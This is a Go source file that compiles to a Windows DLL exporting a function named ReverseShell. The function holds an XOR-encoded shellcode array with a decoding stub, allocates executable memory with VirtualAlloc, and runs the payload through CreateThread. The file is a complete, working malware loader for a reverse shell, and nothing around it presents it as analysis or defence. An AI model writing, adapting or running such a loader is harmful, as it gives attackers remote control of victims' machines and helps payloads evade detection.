package main

/*
#include <string.h>
*/
import "C"

import (
	"log"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

//export ReverseShell
func ReverseShell() {
	targetShellcode := [510]byte{
		0xeb, 0x27, 0x5b, 0x53, 0x5f, 0xb0, 0xdb, 0xfc, 0xae, 0x75, 0xfd, 0x57, 0x59,
		0x53, 0x5e, 0x8a, 0x06, 0x30, 0x07, 0x48, 0xff, 0xc7, 0x48, 0xff, 0xc6, 0x66,
		0x81, 0x3f, 0x2b, 0x56, 0x74, 0x07, 0x80, 0x3e, 0xdb, 0x75, 0xea, 0xeb, 0xe6,
		0xff, 0xe1, 0xe8, 0xd4, 0xff, 0xff, 0xff, 0x14, 0xdb, 0xe8, 0x5c, 0x97, 0xf0,
		0xe4, 0xfc, 0xd4, 0x14, 0x14, 0x14, 0x55, 0x45, 0x55, 0x44, 0x46, 0x45, 0x42,
		0x5c, 0x25, 0xc6, 0x71, 0x5c, 0x9f, 0x46, 0x74, 0x5c, 0x9f, 0x46, 0x0c, 0x5c,
		0x9f, 0x46, 0x34, 0x5c, 0x9f, 0x66, 0x44, 0x5c, 0x1b, 0xa3, 0x5e, 0x5e, 0x59,
		0x25, 0xdd, 0x5c, 0x25, 0xd4, 0xb8, 0x28, 0x75, 0x68, 0x16, 0x38, 0x34, 0x55,
		0xd5, 0xdd, 0x19, 0x55, 0x15, 0xd5, 0xf6, 0xf9, 0x46, 0x55, 0x45, 0x5c, 0x9f,
		0x46, 0x34, 0x9f, 0x56, 0x28, 0x5c, 0x15, 0xc4, 0x9f, 0x94, 0x9c, 0x14, 0x14,
		0x14, 0x5c, 0x91, 0xd4, 0x60, 0x73, 0x5c, 0x15, 0xc4, 0x44, 0x9f, 0x5c, 0x0c,
		0x50, 0x9f, 0x54, 0x34, 0x5d, 0x15, 0xc4, 0xf7, 0x42, 0x5c, 0xeb, 0xdd, 0x55,
		0x9f, 0x20, 0x9c, 0x5c, 0x15, 0xc2, 0x59, 0x25, 0xdd, 0x5c, 0x25, 0xd4, 0xb8,
		0x55, 0xd5, 0xdd, 0x19, 0x55, 0x15, 0xd5, 0x2c, 0xf4, 0x61, 0xe5, 0x58, 0x17,
		0x58, 0x30, 0x1c, 0x51, 0x2d, 0xc5, 0x61, 0xcc, 0x4c, 0x50, 0x9f, 0x54, 0x30,
		0x5d, 0x15, 0xc4, 0x72, 0x55, 0x9f, 0x18, 0x5c, 0x50, 0x9f, 0x54, 0x08, 0x5d,
		0x15, 0xc4, 0x55, 0x9f, 0x10, 0x9c, 0x5c, 0x15, 0xc4, 0x55, 0x4c, 0x55, 0x4c,
		0x4a, 0x4d, 0x4e, 0x55, 0x4c, 0x55, 0x4d, 0x55, 0x4e, 0x5c, 0x97, 0xf8, 0x34,
		0x55, 0x46, 0xeb, 0xf4, 0x4c, 0x55, 0x4d, 0x4e, 0x5c, 0x9f, 0x06, 0xfd, 0x43,
		0xeb, 0xeb, 0xeb, 0x49, 0x5d, 0xaa, 0x63, 0x67, 0x26, 0x4b, 0x27, 0x26, 0x14,
		0x14, 0x55, 0x42, 0x5d, 0x9d, 0xf2, 0x5c, 0x95, 0xf8, 0xb4, 0x15, 0x14, 0x14,
		0x5d, 0x9d, 0xf1, 0x5d, 0xa8, 0x16, 0x14, 0x15, 0xaf, 0xd4, 0xbc, 0x16, 0x63,
		0x55, 0x40, 0x5d, 0x9d, 0xf0, 0x58, 0x9d, 0xe5, 0x55, 0xae, 0x58, 0x63, 0x32,
		0x13, 0xeb, 0xc1, 0x58, 0x9d, 0xfe, 0x7c, 0x15, 0x15, 0x14, 0x14, 0x4d, 0x55,
		0xae, 0x3d, 0x94, 0x7f, 0x14, 0xeb, 0xc1, 0x44, 0x44, 0x59, 0x25, 0xdd, 0x59,
		0x25, 0xd4, 0x5c, 0xeb, 0xd4, 0x5c, 0x9d, 0xd6, 0x5c, 0xeb, 0xd4, 0x5c, 0x9d,
		0xd5, 0x55, 0xae, 0xfe, 0x1b, 0xcb, 0xf4, 0xeb, 0xc1, 0x5c, 0x9d, 0xd3, 0x7e,
		0x04, 0x55, 0x4c, 0x58, 0x9d, 0xf6, 0x5c, 0x9d, 0xed, 0x55, 0xae, 0x8d, 0xb1,
		0x60, 0x75, 0xeb, 0xc1, 0x5c, 0x95, 0xd0, 0x54, 0x16, 0x14, 0x14, 0x5d, 0xac,
		0x77, 0x79, 0x70, 0x14, 0x14, 0x14, 0x14, 0x14, 0x55, 0x44, 0x55, 0x44, 0x5c,
		0x9d, 0xf6, 0x43, 0x43, 0x43, 0x59, 0x25, 0xd4, 0x7e, 0x19, 0x4d, 0x55, 0x44,
		0xf6, 0xe8, 0x72, 0xd3, 0x50, 0x30, 0x40, 0x15, 0x15, 0x5c, 0x99, 0x50, 0x30,
		0x0c, 0xd2, 0x14, 0x7c, 0x5c, 0x9d, 0xf2, 0x42, 0x44, 0x55, 0x44, 0x55, 0x44,
		0x55, 0x44, 0x5d, 0xeb, 0xd4, 0x55, 0x44, 0x5d, 0xeb, 0xdc, 0x59, 0x9d, 0xd5,
		0x58, 0x9d, 0xd5, 0x55, 0xae, 0x6d, 0xd8, 0x2b, 0x92, 0xeb, 0xc1, 0x5c, 0x25,
		0xc6, 0x5c, 0xeb, 0xde, 0x9f, 0x1a, 0x55, 0xae, 0x1c, 0x93, 0x09, 0x74, 0xeb,
		0xc1, 0xaf, 0xe4, 0xa1, 0xb6, 0x42, 0x55, 0xae, 0xb2, 0x81, 0xa9, 0x89, 0xeb,
		0xc1, 0x5c, 0x97, 0xd0, 0x3c, 0x28, 0x12, 0x68, 0x1e, 0x94, 0xef, 0xf4, 0x61,
		0x11, 0xaf, 0x53, 0x07, 0x66, 0x7b, 0x7e, 0x14, 0x4d, 0x55, 0x9d, 0xce, 0xeb,
		0xc1, 0x2b, 0x56}

	shellcodeLoc, err := windows.VirtualAlloc(0, unsafe.Sizeof(targetShellcode), windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		log.Fatal(err)
	}
	C.memcpy(unsafe.Pointer(shellcodeLoc), unsafe.Pointer(&targetShellcode[0]), C.size_t(len(targetShellcode)))
	kernel32DLL := windows.NewLazyDLL("Kernel32.dll")
	createThread := kernel32DLL.NewProc("CreateThread")
	createThread.Call(0, 0, shellcodeLoc, 0, 0, 0)
	time.Sleep(2 * time.Second)
}

func main() {
	// Need a main function to make CGO compile package as C shared library
}
